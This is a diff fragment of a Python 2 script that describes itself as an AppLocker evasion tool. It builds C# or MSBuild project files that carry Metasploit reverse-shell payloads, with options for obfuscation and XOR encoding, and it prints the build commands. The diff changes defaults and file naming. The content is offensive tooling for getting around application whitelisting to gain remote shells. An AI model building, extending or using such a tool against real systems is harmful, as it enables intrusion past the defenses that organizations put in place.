@@ -334,7 +334,7 @@ def installUtil(fwpath,payload,x64=False):
 		text=text.replace("__XTYPE__","UInt32")
 	text=text.replace("__PAYLOAD__",payload)
 	text=text.replace("__PASSWORD__",password)
-	infile=basefile+".cs"
+	infile=basefile
 	outfile=basefile+".exe"
 	print "Compile command line:"
 	if x64:
@@ -375,7 +375,7 @@ def msbuild(fwpath,payload,x64=False):
 	text=text.replace("__PAYLOAD__",payload)
 	text=text.replace("__PASSWORD__",password)
 	text=text.replace("__FWPATH__",fwpath)
-	infile = basefile+".csproj"
+	infile = basefile
 	print "Command line:"
 	if x64:
 		print fwpath.replace("Framework","Framework64")+"\\msbuild.exe "+infile
@@ -395,11 +395,11 @@ methods={ 	"msbuild": msbuild,
 #commandline args
 parser = argparse.ArgumentParser(description='AppLocker evasion tool')
 parser.add_argument('--output', dest='filename', action='store', default='script', help='Output file name without extension' )
-parser.add_argument('--framework', dest='fwv', action='store', default='2.0', help='Framework NET version')
+parser.add_argument('--framework', dest='fwv', action='store', default='4.0', help='Framework NET version')
 parser.add_argument('--payload', dest='payload', action='store', default=None, help='Payload in MSF syntax')
 parser.add_argument('--lhost', dest='lhost', action='store', default=None, help='Local host for reverse shell')
 parser.add_argument('--lport', dest='lport', action='store', default=None, help='Local port for reverse shell')
-parser.add_argument('--method', dest='method', action='store', default='installUtil', help='Evasion method: msbuild or installUtil')
+parser.add_argument('--method', dest='method', action='store', default='msbuild', help='Evasion method: msbuild or installUtil')
 parser.add_argument('--enaobf', dest='enaobf', action='store_const', const="True", default=False, help='Enable CS code obfuscation')
 parser.add_argument('--encshell', dest='encshell', action='store', default=None, help='Encode shell with: yyyymmdd, yyyymm, hostname, or domain')
 parser.add_argument('--enctext', dest='enctext', action='store', default=None, help='Text to xorencode payload with, used with hostname or domain')
@@ -411,11 +411,13 @@ args=parser.parse_args()
 # Arguments checks
 ##################
 
-if ("." in basefile):
-	print "Please, remove the extension from the filename"
-	sys.exit()
-
 basefile=args.filename
+i=0
+fx = basefile
+while os.path.isfile(fx):
+    fx = basefile+'-'+str(i)
+    i+=1
+basefile = fx
 
 if args.fwv not in frameworkversions:
 	print("Please select a correct framework version (1.0, 1.1, 2.0, 3.0 or 4.0)")
